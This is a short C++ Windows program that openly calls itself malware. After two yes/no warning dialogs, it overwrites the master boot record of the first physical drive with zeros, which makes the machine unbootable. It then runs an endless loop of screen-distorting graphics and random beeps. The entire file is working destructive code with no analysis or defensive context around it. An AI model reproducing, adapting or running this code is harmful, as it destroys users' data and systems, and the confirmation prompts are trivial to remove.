#include <Windows.h>

int WINAPI WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nCmdShow
) {
    int res = MessageBox(nullptr, L"This programm is Malware\nIt will overwrite the MBR\nand make ur maschine unusable\n\nYou realy want to run it?", L"Run Malware?", MB_YESNO | MB_ICONWARNING);

    if (res == 6) {
        int des = MessageBox(nullptr, L"IF U CLICK YES UR PC GET DESTROYED\n\n Still Run it?", L"LAST WARNING!!!", MB_YESNO | MB_ICONWARNING);
        if (des == 6) {
            const unsigned char MBR_DATA[512] = { 0 };

            DWORD BytesWritten;
            HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
            WriteFile(hMBR, MBR_DATA, 512, &BytesWritten, NULL);
            CloseHandle(hMBR);

            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            while (true) {
                BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 4, rand() % 4, SRCPAINT);
                Sleep(15);
                Beep(rand() % 800, rand() % 100);
            }

        }

    }

}
